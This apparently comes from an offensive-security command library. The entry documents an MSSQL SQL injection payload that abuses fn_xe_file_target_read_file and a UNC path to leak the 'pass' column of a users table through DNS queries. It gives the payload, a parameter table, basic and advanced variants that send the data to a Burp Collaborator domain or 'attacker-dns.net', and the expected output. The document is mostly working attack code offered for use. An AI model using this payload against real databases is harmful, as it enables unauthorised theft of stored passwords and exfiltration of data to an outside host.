---
id: b33a445e-ebeb-4784-8352-86a07725d663
name: mssql-check-fn-xe-file-target-read-file-access
type: command
executor: sql
data: >-
  1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\' +
  (select pass from users where id=1) +
  '.xxxx.burpcollaborator.net\1.xem',null,null))
output: null
created_at: '2023-04-06T03:56:34.004207+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
platforms:
  - Windows
  - Database
tags:
  - mssql
  - dns-exfiltration
  - sql-injection
verified: true
validated: true
---

# mssql-check-fn-xe-file-target-read-file-access

## Command

```sql
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.xem',null,null))
```

## Description

This SQL command tests VIEW SERVER STATE permission using fn_xe_file_target_read_file to read extended event (.xel) files via a UNC path that embeds data into a DNS query for out-of-band exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `C:\*.xel` | Path pattern for extended event files | Yes |
| `users` | Data source table | Yes |
| `pass` | Exfiltration column | Yes |
| `id=1` | Row selector | Yes |
| `xxxx.burpcollaborator.net` | Collaborator DNS domain | Yes |
| `1.xem` | UNC file target | Built-in |
| `null` | Optional filters for read operation | Built-in |

## Examples

### Basic Usage

```sql
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\' + (select pass from users where id=1) + '.attacker-dns.net\1.xem',null,null))
```

### Advanced Usage

Target different files: ```sql
1 and exists(select * from fn_xe_file_target_read_file('C:\logs\*.xel','\\' + (select pass from users where id=1) + '.attacker-dns.net\1.xem',null,null))
```

## Expected Output

Success returns 1, triggering a DNS query with embedded data (e.g., password.attacker-dns.net). Failure returns 0 or error, no DNS hit.

## Related

- [[procedures/mssql-out-of-band-dns-exfiltration]]
- [[commands/mssql-check-fn-get-audit-file-access]]
